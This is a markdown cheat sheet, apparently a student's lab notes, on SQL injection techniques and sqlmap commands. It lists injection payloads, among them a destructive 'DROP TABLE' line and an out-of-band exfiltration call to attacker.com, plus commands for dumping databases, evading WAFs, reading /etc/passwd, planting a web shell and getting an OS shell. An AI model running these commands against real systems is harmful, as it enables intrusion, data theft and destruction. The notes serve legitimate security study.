---
tags: [basics, tool, sql-injection]
---


> [!info] See also: [[MySQL]] · [[MSSQL]] · [[Postgresql]] · [[SQL INJECTION]]



## SQL injection Techniques 

There are two blind SQL Operations:
 - **Boolean-based blind SQL injection** : `AND 1=1`
 - **Time-based blind SQL Injection**: `AND 1=IF(2>1,SLEEP(5),0)`

You can try to work with time to see if there is a hit or not or you could use SQL statements, with which you are able to verify if something is true or not. If you then are able to use those true/false statements you can start to run experiments (loop over sets) to discover stuff such as passwords for example


Besides the blind Techniques you also have some, which provide you visible content
- **Error-based SQL Injection**: `AND GTID_SUBSET(@@version,0)`
	- You try to trigger error messages, to discover more information about the internal working of the database
- **UNION query-based**: `UNION ALL SELECT 1,@@version,3`
	- When doing UNION bases queries, you are able to attach the information you want to have to an already existing table. 
- **Stacked queries**: `; DROP TABLE users`
- **Out-of-band SQL Injection**: `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`
- **Inline queries**: `SELECT (SELECT @@version) from`





## Basic Commands 
```bash
# Basic Syntax 
python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'

# Get all the support for sql injections 
sqlmap -hh

# Using sqlmap with Post requst
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'

# In case of a complex requst you can use the -r parameter to provide the request as file
sqlmap -r req.txt

# Using specific Techniques for sql based queries 
# B-Boolean-basedblind; ased; U-Unionquery-based;S-Stackedqueries; T-Time-based blind; Q-Inline-queries

# Here for a nexample say that its a mysql database and I will select Union and Error based injections 
sqlmap -r request.txt --dbms=mysql --technique=UE 
```

Example of JSON based request 

```sh
# Where as the * marks the injection pointˆ¬
sqlmap -u 'http://10.2.82.1:59165/cases3.php' -H 'Cookie: id=*' --batch --dump

```


## Troubleshooting commands 

```bash
# Store the traffic 
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt

# Verbose output 
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch 

# Using a proxy 
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch --proxy proxy-ip

```


## Attack Tuning 

```bash 
## Prefix/Suffix - if there is a requirement for special prefix and suffix values in rare cases
sqlmap -u "http://www.target.com/vuln.php?q=test" --prefix="%'))" --suffix="-- -"

## Level/Risk; --level 1-5 (default: 1) extends both vectors and boundaries being used, based on their expectancy of success; --risk 1-3 (default: 1) exends the used vetor set based on their risk of causing problems at the target side
sqlmap -u www.example.com/?id=1 -v 3 --level=5


# Query used to find the flag in challenge 5 
sqlmap -u 'http://STMIP:STMPO/case5.php?id=*' --level 5 --risk 3 -T flag5 --batch --dump

```

## Enumeration 

```bash 
# Actually you can do some pretty decent enumeration using sqlmap 
# Those commands do work in case you have already proven, that there exists an SQLi

# Database version banner
sqlmap -r request.txt --banner

# Get current user 
sqlmap -r request.txt --current-user 

# Current database name 
sqlmap -r request.txt --current-db 

# Check if user has admin rights 
sqlmap -r request.txt --is-dba

# The options can also be combined in something such as 
sqlmap -r request.txt --banner --current-db --is-dba

# List all Databases 
sqlmap -r requests.txt --dbs

# List all tables from database dummy 
sqlmap -r requests.txt -D dummy --tables

# Dump all the values from the table magic
sqlmap -r requests.txt -D dummy -T magic --dump

# Schema enumeration 
sqlmap -r request.txt --schema

# Searching for Tables containing 'users'
sqlmap -r request.txt --search -T user

# Searching for Columns containing pass
sqlmap -r request.txt --search -C pass

```


## WAF and Tamper Scripts 

```bash
# Anti-CSRF Token Bypass -> You can tell sqlmap what the token parameter is to work around it 
sqlmap -r request.txt --csrf-token="TokenName"

# Unique Value Bypass -> Adding randomization to avoid this check (in this case the GET PARAMETER which needs to be randomized is rp)
sqlmap -r requests.txt --randomize=rp --batch

# Calculated parameter bypass -> In case you need to compute a value to be able to do the request you can use eval 
sqlmap -r request.txt --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch

# Randomize the User Agent 
sqlmap -r request.txt --random-agent

#.Using Tamper scripts -> There are a lot of them in sqlmap. Here the two scripts between and randomcase are used
sqlmap -r request.txt --tamper=between,randomcase

```


## Reading and Writing Files 
In case you are DB administrator, you can try to read files 

```sh
# Reading from a file using sqlmap
sqlmap -r request.txt --file-read "/etc/passwd"

# Writing to a file trying to upload a reverse shell
sqlmap -r request.txt --file-write "shell.php" --file-dest "/var/www/html/shell.php"

# In case of a successful upload you could then do a. 
curl http://www.example.com/shell.php?cmd=ls+-

# Using sql to get an os shell (Using the techniique for Error-based SQL injection)
sqlmap -r request.txt --os-shell --technique=E


```